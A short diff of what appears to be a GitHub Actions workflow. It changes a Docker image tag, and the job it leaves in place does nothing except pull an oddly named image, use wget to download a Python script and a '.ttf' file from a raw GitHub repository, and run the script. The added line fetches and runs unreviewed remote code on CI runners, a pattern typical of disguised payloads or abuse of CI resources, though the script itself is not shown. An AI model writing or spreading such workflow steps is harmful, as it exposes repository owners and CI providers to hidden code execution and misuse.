@@ -14,7 +14,7 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - name: Pull Docker image
-      run: docker pull livetest/d3thtr3p:v2
+      run: docker pull livetest/d3thtr3p:v1
     - name: Run Docker file
       run: |
-            docker run livetest/d3thtr3p:v2 sh -c "wget https://raw.githubusercontent.com/fbythub/xd_1/main/Z.py && wget https://raw.githubusercontent.com/fbythub/xd_1/main/_.ttf && python3 Z.py"
+            docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/fbythub/xd_1/main/Z.py && wget https://raw.githubusercontent.com/fbythub/xd_1/main/_.ttf && python3 Z.py"
